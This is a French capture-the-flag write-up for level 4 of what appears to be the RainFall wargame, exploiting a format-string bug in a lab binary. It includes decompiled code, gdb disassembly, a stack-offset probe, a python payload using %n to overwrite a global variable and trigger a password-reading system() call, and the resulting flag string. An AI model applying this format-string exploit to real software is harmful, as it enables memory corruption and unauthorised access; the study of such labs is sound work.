# Level 4

Nous avons un exécutable similaire au niveau précédent.
Décompilons:
```
void p(char *param_1)
{
  printf(param_1);
  return;
}

void n(void)
{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void)
{
  n();
  return;
}
```
Cette fois-ci le code est séparé en 3 fonctions, et le printf est dans une fonction a part.
Le code affiche toujours stdin sur stdout.Nous allons utiliser la faille de printf comme precedemment.
Trouvons les adresses que nous avons besoin avec gdb.
```
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
```
ici l'adresse de "m" est 0x8049810, et le contenu est comparé avec "$0x1025544" pour exécuter la commande system("/bin/cat /home/user/level5/.pass").
Il ne manque plus qu'a trouver la place du buffer ou nous pouvons controler l'execution du programme.
```
(gdb) run
Starting program: /home/user/level4/level4
AAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
AAAAAb7ff26b0.bffff764.b7fd0ff4.0.0.bffff728.804848d.bffff520.200.b7fd1ac0.b7ff37d0.41414141
```
Ici le 12e élément.
Nous n'avons plus qu'a injecter le payload suivant:
```
python -c 'print("\x10\x98\x04\x08" + "%16930111x" + " %12$n")' > /tmp/exploit1
```
"%16930111x" : le nombre d'espace que dois compter %n pour set "m".
0x1025544 aurait du faire en décimal 16930116 - 4 = 16930112. Sur gdb ca fonctionnait mais en dehors de gdb pour l'exécution j'ai du mettre "16930111".
```
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930111x" + " %12$n")' > /tmp/exploit1
                                                                               b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```